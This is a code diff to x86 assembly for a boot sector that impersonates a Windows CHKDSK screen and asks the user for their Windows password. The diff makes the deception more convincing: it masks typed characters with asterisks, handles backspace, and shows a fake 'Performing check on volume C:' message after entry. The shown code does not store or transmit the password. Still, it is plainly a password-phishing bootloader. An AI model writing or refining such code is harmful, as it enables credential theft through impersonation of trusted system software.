@@ -39,6 +39,8 @@ sleep:
 blank db 13, 10, 0
 checkfs db 'Windows CHKDSK', 13, 10, '==============', 13, 10, 13, 10, 'Checking file system on C:', 0
 ntfs db 13, 10, 'The type of file system is NTFS.', 13, 10, 13, 10, 'One of your disks needs to be checked for consistency. You', 13, 10, 'must complete this disk check before using your computer.', 13, 10, 13, 10, 'Please enter your Windows password to continue: ', 0
+rmchar db 8,' ',8,0
+checking db 13,10,13,10, 'Performing check on volume C:', 13,10,'This may take up to a minute.',0
 
 start:
  mov ax, cs
@@ -54,12 +56,18 @@ readchar:
  int 0x16
  cmp al, 13
  je done_password
+ cmp al, 8
+ je backspace
+ mov al, '*'
  call putc
- jmp readchar
+ jmp loop
+ backspace:
+  biosprint rmchar
+ loop:
+  jmp readchar
 
 done_password:
-
- biosprint checkfs
+ biosprint checking
  jmp $
 
 times 510 - ($ - $$) db 0
